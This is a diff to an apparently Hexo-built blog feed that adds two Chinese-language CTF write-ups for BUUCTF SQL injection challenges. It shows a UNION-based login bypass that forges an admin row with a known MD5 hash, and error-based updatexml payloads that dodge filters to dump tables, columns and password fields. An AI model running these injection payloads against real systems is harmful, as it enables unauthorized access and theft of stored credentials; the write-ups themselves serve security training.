@@ -4,6 +4,48 @@
   
     
     <entry>
+      <title>【GXYCTF2019】BabySQli</title>
+      <link href="/2021/07/12/buuctf%E3%80%90GXYCTF2019%E3%80%91BabySQli/"/>
+      <url>/2021/07/12/buuctf%E3%80%90GXYCTF2019%E3%80%91BabySQli/</url>
+      
+        <content type="html"><![CDATA[<p>上图~~~</p><img src="/buuctf/DBabySQL1.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL1" style="zoom:60%;" /><p><img src="/buuctf/DBabySQL2.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>界面很简洁，老样子，试试二次注入，发现然并卵。但是发现了这道题是POST传参。</p><p>打开burp suite抓了包并对其进行了篡改，但并没有什么用。</p><img src="/buuctf/DBabySQL3.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL3" style="zoom:60%;" /><p>然后看了下他的返回值发现有一行不知道什么的注释，然后百度了下发现是base32编码</p><img src="/buuctf/DBabySQL4.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL4" style="zoom:60%;" /><p>然后用base32解码后发现还要base64解码。</p><p>出来是<code>select * from user where username = &#39;$name&#39;</code></p><p>这就可以看出这道题是对数据库进行查询的。</p><p>然后用刚刚了解到的fuzz测试测了下。啊~我这个fuzz字典感觉不是很好吧。</p><p><img src="/buuctf/DBabySQL5.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL5"></p><p>虽然不是很好，但还是看得出对哪些字符有过滤的，得知对联合查询并没有过滤但是对order、or、=等字符进行了过滤。</p><p>这里只能用unions elect代替order by了。</p><p>输入1’ unions elect 1,2,3,4# 返回错误 再试试 1’ union select 1,2,3#返回正确。</p><p>可以得知有3列字段。</p><p>这里使用联合查询数据库，报错注入查询，都不行。感觉没辙了，再试试时间注入。</p><p><img src="/buuctf/DBabySQL7.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>结果都显示这个。麻了，然后查阅了大佬的博客发现一个新的知识点。</p><p><strong>联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p>上面的尝试中，我们应该可以发现，admin的用户是存在的。</p><p>在知识点中，我是这样理解的，在联合查询一个并不存在的数据，他会构造一个虚拟的数据，我们利用这个虚拟的数据是可以登陆成功的。</p><p>大佬给的数据是这样的：</p><p>密码: 1234</p><p>MD5：81dc9bdb52d04dc20036dbd8313ed055</p><p>然后构造playload:</p><p>账号：1’ union select 1,’admin’,’81dc9bdb52d04dc20036dbd8313ed055’#</p><p>密码：1234</p><p>注意账号这里不能使用admin 具体我不清楚，我试了是不可以的。然后就直接拿到了flag。就是sqli-labs这个例子。</p><img src="/buuctf/DBabySQL8.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL8" style="zoom:60%;" /><p>他是可以显示的，也就说明它虽不是真实的，但它是存在的。</p><p>原理就是构造一个虚拟身份来绕过审核机制。</p><p><img src="/buuctf/DBabySQL6.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL6"></p><p> [参考文献]                             <a href="https://blog.csdn.net/m0_46412682/article/details/107948262">参考大佬博客</a><br>                                  <a href="ttps://yuaneuro.cn/archives/21.html">联合查询构造虚拟数据 知识点详解</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> buuctf-web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【极客大挑战 2019】HardSQL</title>
+      <link href="/2021/07/12/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91HardSQL/"/>
+      <url>/2021/07/12/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91HardSQL/</url>
+      
+        <content type="html"><![CDATA[<p>上图~~~</p><img src="/buuctf/HardSQL1.PNG" class="lazyload" data-srcset="/buuctf/HardSQL1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><img src="/buuctf/HardSQL2.PNG" class="lazyload" data-srcset="/buuctf/HardSQL2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p>看来设计者还是盲目自信呀，这一看就是数据库操作，过滤了一些特殊字符而已。</p><p>试了下二次注入，被过滤了。然后就开始操作，一直注入一直错误。</p><img src="/buuctf/HardSQL3.PNG" class="lazyload" data-srcset="/buuctf/HardSQL3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p>还说我是臭弟弟，看样子普通注入不怎么行了，试试报错注入。在测试的过程中发现其过滤了空格和联合注入，等号。</p><img src="/buuctf/HardSQL4.PNG" class="lazyload" data-srcset="/buuctf/HardSQL4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p>在报错的过程中，我们可以将空格用括号代替，将等号用like代替。%23代替#，这样查到了geek库名</p><p>再查表:<code>or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23</code></p><p>查字段:<code>or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(0x表名))),1))%23</code></p><p>查字段的值:<code>or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.表名))),1))%23</code></p><p><img src="/buuctf/HardSQL5.PNG" class="lazyload" data-srcset="/buuctf/HardSQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>之后你会发现，flag并没有给完，只给了一半，我们可以利用left()、right()函数进行拼接。</p><p>拼接:<code>or(updatexml(1,concat(0x7e,(select(group_concat(left(password,30))from(geek.表名))),1))%23</code></p><p><code>or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30))from(geek.表名))),1))%23</code></p><p><font color="blue">温馨提示：要注意拼接哦</font></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> buuctf-web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【SUCTF 2019】 *EasySQL*</title>
       <link href="/2021/07/11/buuctf%20%E3%80%90SUCTF%202019%E3%80%91%20EasySQL/"/>
       <url>/2021/07/11/buuctf%20%E3%80%90SUCTF%202019%E3%80%91%20EasySQL/</url>
